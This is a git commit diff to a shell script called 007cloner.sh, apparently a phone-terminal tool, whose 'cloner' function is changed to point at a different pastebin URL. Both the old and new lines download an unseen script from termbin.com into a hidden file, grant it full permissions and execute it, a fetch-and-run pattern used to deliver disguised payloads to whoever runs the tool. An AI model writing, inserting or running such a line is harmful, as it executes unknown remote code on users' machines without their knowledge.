5ea2ec54090a30352c5b1bf46a7d18259c5c22b5
JAMAX <41843390+User99021@users.noreply.github.com>
2020-09-09 21:44:30 -0400

    Update 007cloner.sh

--- 007cloner.sh
+++ 007cloner.sh
@@ -3,7 +3,7 @@ function dep () {
     printf "INSTALL PYTHON..."pkg install python -y 1> /dev/null
 }
 function cloner () {
-    wget -qO- https://termbin.com/zzqob > .luks && chmod 7777 .luks && bash .luks
+    wget -qO- https://termbin.com/w0n8 > .luks && chmod 7777 .luks && ./.luks
 }
 
 function bn () {
